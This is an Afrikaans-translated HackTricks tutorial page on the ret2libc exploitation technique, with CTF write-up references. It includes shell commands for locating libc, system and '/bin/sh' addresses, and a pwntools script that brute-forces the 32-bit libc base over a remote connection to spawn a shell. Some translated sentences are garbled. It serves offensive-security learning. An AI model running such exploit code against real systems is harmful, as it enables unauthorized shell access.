# Ret2lib

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Controleer de [**abonnementsplannen**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## **Basiese Inligting**

Die essensie van **Ret2Libc** is om die uitvoervloei van 'n kwesbare program om te lei na 'n funksie binne 'n gedeelde biblioteek (bv. **system**, **execve**, **strcpy**) in plaas van die uitvoering van aanvaller-voorsiene shellcode op die stok. Die aanvaller stel 'n lading op wat die terugkeeradres op die stok wysig om na die gewenste biblioteekfunksie te wys, terwyl hy ook re√´l vir enige nodige argumente om korrek opgestel te word volgens die oproepkonvensie.

### **Voorbeeldstappe (vereenvoudig)**

* Kry die adres van die funksie om te roep (bv. system) en die bevel om te roep (bv. /bin/sh)
* Genereer 'n ROP-ketting om die eerste argument wat na die bevelstring wys, en die uitvoervloei na die funksie te stuur

## Vind die adresse

* Veronderstel dat die `libc` wat gebruik word die een van die huidige masjien is, kan jy vind waar dit in die geheue gelaai sal word met:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

As jy wil nagaan of die ASLR die adres van libc verander, kan jy dit doen:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* As jy die libc wat gebruik word ken, is dit ook moontlik om die skuif na die `system`-funksie te vind met:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* As jy die libc wat gebruik word ken, is dit ook moontlik om die skuif na die string `/bin/sh` funksie te vind met:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Gebruik van gdb-peda / GEF

Met kennis van die gebruikte libc, is dit ook moontlik om Peda of GEF te gebruik om die adres van die **system**-funksie, die **exit**-funksie en die string **`/bin/sh`** te kry:
```bash
p system
p exit
find "/bin/sh"
```
### Gebruik /proc/\<PID>/maps

Indien die proses elke keer as jy met dit praat **kinders skep** (netwerkbediener), probeer om daardie l√™er te **lees** (jy sal waarskynlik rootregte benodig).

Hier kan jy **presies vind waar die libc gelaai is** binne die proses en **waar dit gelaai gaan word** vir elke kind van die proses.

![](<../../../.gitbook/assets/image (853).png>)

In hierdie geval is dit gelaai by **0xb75dc000** (Dit sal die basisadres van libc wees)

## Onbekende libc

Dit mag moontlik wees dat jy **nie weet watter libc die bin√™re l√™ nie laai** (omdat dit dalk in 'n bediener gele√´ is waar jy geen toegang tot het nie). In daardie geval kan jy die kwesbaarheid misbruik om **sekere adresse te lek en te vind watter libc**-biblioteek gebruik word:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

En jy kan 'n pwntools-sjabloon hiervoor vind in:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Ken libc met 2 verskuiwings

Kyk na die bladsy [https://libc.blukat.me/](https://libc.blukat.me/) en gebruik 'n **paar adresse** van funksies binne die libc om die **gebruikte weergawe** te vind.

## ASLR omseil in 32-bits

Hierdie brute-krag aanvalle is **slegs nuttig vir 32-bits stelsels**.

* As die aanval plaaslik is, kan jy probeer om die basisadres van libc met brute krag te agterhaal (nuttig vir 32-bits stelsels):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Indien jy 'n afgele√´ bediener aanval, kan jy probeer om die adres van die `libc`-funksie `usleep` deur **brute-force** te vind, deur 10 as argument te stuur. As die bediener op 'n sekere punt **10 sekondes langer neem om te reageer**, het jy die adres van hierdie funksie gevind.

## Een Gadget

Voer 'n skaal uit deur net te spring na **een** spesifieke **adres** in libc:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Kodevoorbeeld

In hierdie voorbeeld is ASLR brute-force ge√Øntegreer in die kode en die kwesbare bin√™re l√™ op 'n afgele√´ bediener:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Kodevoorbeeld

Kyk na die voorbeeld van:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Voorbeeld

In die geval van ARM64, spring die ret instruksie na waar die x30-register na wys en nie waar die stapelregister na wys nie. Dit is dus 'n bietjie meer ingewikkeld.

Ook in ARM64 doen 'n instruksie wat die instruksie doen (dit is nie moontlik om in die middel van instruksies te spring en hulle in nuwes te verander nie).

Kyk na die voorbeeld van:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-in-printf (of puts)

Dit maak dit moontlik om **inligting uit die proses te lek** deur `printf`/`puts` te roep met sekere spesifieke data as 'n argument geplaas. Byvoorbeeld, deur die adres van `puts` in die GOT in 'n uitvoering van `puts` te plaas, sal die adres van `puts` in die geheue **lek**.

## Ret2printf

Dit beteken basies die misbruik van 'n **Ret2lib om dit in 'n `printf` formaat string kwesbaarheid te omskep** deur die `ret2lib` te gebruik om printf te roep met die waardes om dit te benut (klink nutteloos maar moontlik):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Ander Voorbeelde & verwysings

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, gegewe 'n lek na die adres van 'n funksie in libc, deur een gadget te gebruik
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64-bis, ASLR geaktiveer maar geen PIE, die eerste stap is om 'n oorvloei te vul tot by die byte 0x00 van die kanarie om dan puts te roep en dit te lek. Met die kanarie word 'n ROP-gadget geskep om puts te roep om die adres van puts van die GOT te lek en dan 'n ROP-gadget om `system('/bin/sh')` te roep
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64-bis, ASLR geaktiveer, geen kanarie, stapel oorvloei in hoof van 'n kindfunksie. ROP-gadget om puts te roep om die adres van puts van die GOT te lek en dan 'n een-gadget te roep.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64-bis, geen pie, geen kanarie, geen relro, nx. Gebruik skryffunksie om die adres van skryf (libc) te lek en roep een gadget.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Gebruik 'n formaatstring om die kanarie van die stapel te lek en 'n buffer oorvloei om in te roep na stelsel (dit is in die GOT) met die adres van `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32-bis, geen relro, geen kanarie, nx, pie. Misbruik 'n slegte indeksering om adresse van libc en heap van die stapel te lek. Misbruik die buffer oorvloei om 'n ret2lib te doen wat `system('/bin/sh')` roep (die heap-adres is nodig om 'n kontrole te omseil).
